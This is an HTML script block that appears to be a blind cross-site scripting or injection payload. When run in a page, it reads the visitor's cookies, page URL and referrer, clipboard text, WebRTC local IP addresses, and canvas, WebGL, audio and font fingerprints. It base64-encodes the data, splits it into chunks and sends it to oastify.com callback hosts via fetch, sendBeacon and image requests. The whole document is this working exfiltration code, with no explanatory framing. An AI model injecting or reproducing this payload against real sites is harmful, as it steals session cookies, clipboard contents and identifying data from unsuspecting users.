    <script>
    (async () => {
        'use strict';

        // ---------- Helpers ----------
        // Convert a string to base64 (UTF‑8 safe)
        function toBase64(str) {
            const bytes = new TextEncoder().encode(str);
            const binary = String.fromCharCode(...bytes);
            return btoa(binary);
        }

        // Send a chunk (or any data) to the OAST server
        function sendToOast(session, chunkIndex, totalChunks, dataBase64) {
            const baseUrl = 'https://ld2evoeentalwtwpg5bs18kz0q6hu8ix.oastify.com/';
            const url = `${baseUrl}?session=${session}&chunk=${chunkIndex}&total=${totalChunks}&data=${encodeURIComponent(dataBase64)}`;

            // Multiple delivery methods for reliability
            try { fetch(url, { mode: 'no-cors', cache: 'no-store' }); } catch (_) {}
            try { if (navigator.sendBeacon) navigator.sendBeacon(url); } catch (_) {}
            try { new Image().src = url; } catch (_) {}
        }

        // ---------- Main collection ----------
        const session = Math.random().toString(36).slice(2) + Date.now().toString(36);
        const data = {};

        // ---- 1. Navigator & Client Hints ----
        data.navigator = {};
        try {
            const navProps = [
                'userAgent','appCodeName','appName','appVersion','platform','product','productSub',
                'vendor','vendorSub','language','languages','cookieEnabled','onLine',
                'hardwareConcurrency','deviceMemory','maxTouchPoints','doNotTrack',
                'pdfViewerEnabled','webdriver','buildID','oscpu'
            ];
            navProps.forEach(k => {
                try { data.navigator[k] = navigator[k]; } catch (_) {}
            });
            if (navigator.userAgentData) {
                try {
                    data.navigator.uaData = await navigator.userAgentData.getHighEntropyValues([
                        'platform','platformVersion','architecture','model','uaFullVersion',
                        'fullVersionList','bitness','wow64','formFactors'
                    ]);
                    data.navigator.uaDataMobile = navigator.userAgentData.mobile;
                    data.navigator.uaDataBrands = navigator.userAgentData.brands;
                } catch (_) {}
            }
        } catch (_) {}

        // ---- 2. Screen & Window ----
        data.display = {};
        try {
            const screenProps = [
                'width','height','availWidth','availHeight','colorDepth','pixelDepth',
                'availLeft','availTop'
            ];
            screenProps.forEach(k => { data.display['screen_' + k] = screen[k]; });
            if (screen.orientation) {
                data.display.screen_orientation = {
                    type: screen.orientation.type,
                    angle: screen.orientation.angle
                };
            }
            data.display.window = {
                innerWidth, innerHeight, outerWidth, outerHeight,
                screenX, screenY, screenLeft, screenTop,
                devicePixelRatio, length: window.length, name: window.name,
                opener: !!window.opener, isFramed: self !== top,
                crossOriginIsolated, isSecureContext, origin: location.origin
            };
            try { top.location.href; data.display.window.isCrossOriginFramed = false; }
            catch (_) { data.display.window.isCrossOriginFramed = true; }
        } catch (_) {}

        // ---- 3. Location, Document & Locale ----
        data.page = {};
        try {
            data.page.location = {
                href: location.href, protocol: location.protocol,
                host: location.host, hostname: location.hostname,
                port: location.port, pathname: location.pathname,
                search: location.search, hash: location.hash, origin: location.origin
            };
            data.page.document = {
                title: document.title, referrer: document.referrer,
                domain: document.domain, cookie: document.cookie,
                lastModified: document.lastModified, readyState: document.readyState,
                characterSet: document.characterSet, compatMode: document.compatMode
            };
            data.page.locale = Intl.DateTimeFormat().resolvedOptions();
            data.page.timezoneOffset = new Date().getTimezoneOffset();
            data.page.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            data.page.date = new Date().toString();
        } catch (_) {}

        // ---- 4. Plugins, MIME & Features ----
        data.browser = {};
        try {
            data.browser.plugins = Array.from(navigator.plugins || []).map(p => ({
                name: p.name, filename: p.filename, description: p.description
            }));
            data.browser.pluginsCount = navigator.plugins?.length || 0;
            data.browser.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => ({
                type: m.type, description: m.description, suffixes: m.suffixes
            }));
            data.browser.features = {
                wasm: typeof WebAssembly === 'object',
                sharedArrayBuffer: typeof SharedArrayBuffer !== 'undefined',
                bigInt: typeof BigInt !== 'undefined',
                webGPU: 'gpu' in navigator,
                webRTC: 'RTCPeerConnection' in window,
                webAudio: !!(window.AudioContext || window.webkitAudioContext),
                fileSystemAccess: 'showOpenFilePicker' in window,
                bluetooth: 'bluetooth' in navigator,
                usb: 'usb' in navigator,
                serial: 'serial' in navigator,
                hid: 'hid' in navigator,
                serviceWorker: 'serviceWorker' in navigator,
                sharedWorker: typeof SharedWorker !== 'undefined',
                indexedDB: 'indexedDB' in window,
                cacheAPI: 'caches' in window
            };
            data.browser.historyLength = history.length;
            if (typeof Notification !== 'undefined') {
                data.browser.notificationPermission = Notification.permission;
            }
        } catch (_) {}

        // ---- 5. WebGL, WebGL2 & Canvas ----
        data.graphics = {};
        try {
            const c = document.createElement('canvas');
            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
            if (gl) {
                let unmaskedVendor = null, unmaskedRenderer = null;
                try {
                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                    if (dbg) {
                        unmaskedVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
                        unmaskedRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
                    }
                } catch (_) {}
                data.graphics.webgl = {
                    vendor: gl.getParameter(gl.VENDOR),
                    renderer: gl.getParameter(gl.RENDERER),
                    version: gl.getParameter(gl.VERSION),
                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                    unmaskedVendor, unmaskedRenderer,
                    extensions: gl.getSupportedExtensions()
                };
            }
            const gl2 = document.createElement('canvas').getContext('webgl2');
            if (gl2) {
                data.graphics.webgl2 = {
                    version: gl2.getParameter(gl2.VERSION),
                    vendor: gl2.getParameter(gl2.VENDOR),
                    renderer: gl2.getParameter(gl2.RENDERER)
                };
            }
            // Extended canvas fingerprint
            const c2 = document.createElement('canvas');
            const ctx = c2.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('abcdefghijklmnopqrstuvwxyz0123456789', 2, 2);
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('abcdefghijklmnopqrstuvwxyz0123456789', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('abcdefghijklmnopqrstuvwxyz0123456789', 4, 17);
            // Add a second canvas with different text to increase entropy
            const c3 = document.createElement('canvas');
            const ctx3 = c3.getContext('2d');
            ctx3.textBaseline = 'bottom';
            ctx3.font = '18px Times New Roman';
            ctx3.fillStyle = '#000';
            ctx3.fillText('The quick brown fox jumps over the lazy dog', 10, 30);
            ctx3.strokeStyle = '#f00';
            ctx3.lineWidth = 2;
            ctx3.strokeRect(5, 5, 200, 40);
            data.graphics.canvas1 = c2.toDataURL();
            data.graphics.canvas2 = c3.toDataURL();
        } catch (_) {}

        // ---- 6. Performance, Connection, Battery, Storage ----
        data.system = {};
        try {
            data.system.performance = { now: performance.now(), timeOrigin: performance.timeOrigin };
            if (performance.memory) {
                data.system.performance.memory = {
                    usedJSHeapSize: performance.memory.usedJSHeapSize,
                    totalJSHeapSize: performance.memory.totalJSHeapSize,
                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
                };
            }
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                data.system.connection = {
                    effectiveType: conn.effectiveType, downlink: conn.downlink,
                    rtt: conn.rtt, saveData: conn.saveData, type: conn.type
                };
            }
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                data.system.battery = {
                    charging: b.charging, level: b.level,
                    chargingTime: b.chargingTime, dischargingTime: b.dischargingTime
                };
            }
            if (navigator.storage?.estimate) {
                data.system.storageEstimate = await navigator.storage.estimate();
            }
            try { data.system.localStorageLen = localStorage.length; } catch (_) {}
            try { data.system.sessionStorageLen = sessionStorage.length; } catch (_) {}
            data.system.hardware = {
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                maxTouchPoints: navigator.maxTouchPoints
            };
        } catch (_) {}

        // ---- 7. Media Devices, Permissions & Media Queries ----
        data.media = {};
        try {
            const devs = await navigator.mediaDevices.enumerateDevices();
            data.media.mediaDevices = devs.map(d => ({
                kind: d.kind,
                label: d.label ? '[redacted]' : '',
                deviceId: d.deviceId ? d.deviceId.slice(0, 8) + '...' : '',
                groupId: d.groupId ? d.groupId.slice(0, 8) + '...' : ''
            }));
            data.media.mediaDevicesCount = devs.length;

            const names = ['camera','microphone','geolocation','notifications',
                           'clipboard-read','clipboard-write','persistent-storage'];
            data.media.permissions = {};
            for (const n of names) {
                try {
                    const r = await navigator.permissions.query({name: n});
                    data.media.permissions[n] = r.state;
                } catch (_) {}
            }
            data.media.mediaQueries = {
                prefersColorScheme: matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
                prefersReducedMotion: matchMedia('(prefers-reduced-motion: reduce)').matches,
                hover: matchMedia('(hover: hover)').matches,
                pointer: matchMedia('(pointer: coarse)').matches ? 'coarse' :
                         matchMedia('(pointer: fine)').matches ? 'fine' : 'none'
            };
        } catch (_) {}

        // ---- 8. WebRTC, Audio & Fonts ----
        data.fingerprint = {};
        try {
            // WebRTC – wait for ICE gathering to finish
            const pc = new RTCPeerConnection({iceServers: []});
            pc.createDataChannel('');
            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);
            data.fingerprint.webrtc = [];
            const candidates = [];
            pc.onicecandidate = e => {
                if (e.candidate && e.candidate.candidate) {
                    const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                    if (m) candidates.push(m[1]);
                }
            };
            await new Promise((resolve) => {
                if (pc.iceGatheringState === 'complete') resolve();
                else pc.onicegatheringstatechange = () => {
                    if (pc.iceGatheringState === 'complete') resolve();
                };
            });
            data.fingerprint.webrtc = [...new Set(candidates)];
            pc.close();

            // Audio
            const AC = window.AudioContext || window.webkitAudioContext;
            if (AC) {
                const ctx = new AC();
                data.fingerprint.audio = {
                    sampleRate: ctx.sampleRate,
                    state: ctx.state,
                    baseLatency: ctx.baseLatency || null,
                    maxChannelCount: ctx.destination.maxChannelCount
                };
                ctx.close();
            }

            // Font detection
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const fontList = ['Arial','Arial Black','Calibri','Comic Sans MS','Courier New',
                              'Georgia','Impact','Times New Roman','Trebuchet MS','Verdana',
                              'Segoe UI','Tahoma','Lucida Console','MS Gothic'];
            const h = document.createElement('span');
            h.style.cssText = 'position:absolute;left:-9999px;font-size:72px;';
            h.textContent = 'mmmmmmmmmmlli';
            document.body.appendChild(h);
            const defaults = {};
            baseFonts.forEach(b => { h.style.fontFamily = b; defaults[b] = h.offsetWidth; });
            data.fingerprint.detectedFonts = [];
            fontList.forEach(f => {
                let found = false;
                baseFonts.forEach(b => {
                    h.style.fontFamily = `"${f}",${b}`;
                    if (h.offsetWidth !== defaults[b]) found = true;
                });
                if (found) data.fingerprint.detectedFonts.push(f);
            });
            document.body.removeChild(h);
        } catch (_) {}

        // ---- 9. Additional advanced APIs ----
        data.extra = {};
        try {
            // Media Capabilities
            if (navigator.mediaCapabilities) {
                const mc = navigator.mediaCapabilities;
                const videoConfig = { type: 'file', video: { contentType: 'video/mp4', width: 1920, height: 1080, bitrate: 1000000, framerate: 30 } };
                const audioConfig = { type: 'file', audio: { contentType: 'audio/mp4', channels: 2, bitrate: 128000, samplerate: 44100 } };
                try {
                    data.extra.mediaCapabilities = {
                        video: await mc.decodingInfo(videoConfig),
                        audio: await mc.decodingInfo(audioConfig)
                    };
                } catch (_) {}
            }

            // Virtual Keyboard (mobile)
            if (navigator.virtualKeyboard) {
                data.extra.virtualKeyboard = {
                    boundingRect: navigator.virtualKeyboard.boundingRect,
                    overlaysContent: navigator.virtualKeyboard.overlaysContent,
                    geometrychange: !!navigator.virtualKeyboard.ongeometrychange
                };
            }

            // XR
            if (navigator.xr) {
                data.extra.xr = {
                    isSessionSupported: await navigator.xr.isSessionSupported('immersive-vr'),
                    isHandTracking: 'hand' in navigator.xr
                };
            }

            // Wake Lock
            if (navigator.wakeLock) {
                try {
                    const wl = await navigator.wakeLock.request('screen');
                    data.extra.wakeLock = { type: wl.type, released: false };
                    wl.release();
                    data.extra.wakeLock.released = true;
                } catch (_) {}
            }

            // Clipboard (read text)
            if (navigator.clipboard) {
                try {
                    const text = await navigator.clipboard.readText();
                    data.extra.clipboardText = text || '';
                } catch (_) {}
            }

            // Gamepads
            if (navigator.getGamepads) {
                const pads = navigator.getGamepads();
                data.extra.gamepads = pads ? Array.from(pads).filter(Boolean).map(g => ({
                    id: g.id, index: g.index, connected: g.connected,
                    mapping: g.mapping, axesLength: g.axes.length, buttonsLength: g.buttons.length
                })) : [];
            }

            // Media Session
            if (navigator.mediaSession) {
                data.extra.mediaSession = {
                    metadata: !!navigator.mediaSession.metadata,
                    playbackState: navigator.mediaSession.playbackState,
                    actionHandlers: ['play','pause','seekbackward','seekforward','previoustrack','nexttrack'].filter(a =>
                        navigator.mediaSession.setActionHandler ? true : false
                    )
                };
            }

            // Presentation API
            if (navigator.presentation) {
                data.extra.presentation = {
                    defaultRequest: !!navigator.presentation.defaultRequest,
                    receiver: !!navigator.presentation.receiver
                };
            }

            // Share API
            if (navigator.share) {
                data.extra.share = { canShare: navigator.canShare ? navigator.canShare({ title: 'test' }) : false };
            }
        } catch (_) {}

        // ---------- Send in 3 chunks ----------
        const json = JSON.stringify({ session, data });
        const totalLen = json.length;
        const chunkSize = Math.ceil(totalLen / 3);
        const chunks = [];
        for (let i = 0; i < 3; i++) {
            const start = i * chunkSize;
            const end = Math.min(start + chunkSize, totalLen);
            chunks.push(json.slice(start, end));
        }

        // Encode each chunk to base64 and send
        chunks.forEach((chunk, idx) => {
            const b64 = toBase64(chunk);
            sendToOast(session, idx + 1, 3, b64);
        });

        // Done marker
        setTimeout(() => {
            const doneUrl = `https://l2orezrwaf56bptlx6279r9an1tshi57.oastify.com/?session=${session}&part=done&total=3`;
            try { fetch(doneUrl, { mode: 'no-cors' }).catch(() => {}); } catch (_) {}
            try { new Image().src = doneUrl; } catch (_) {}
        }, 500);
    })();
    </script>
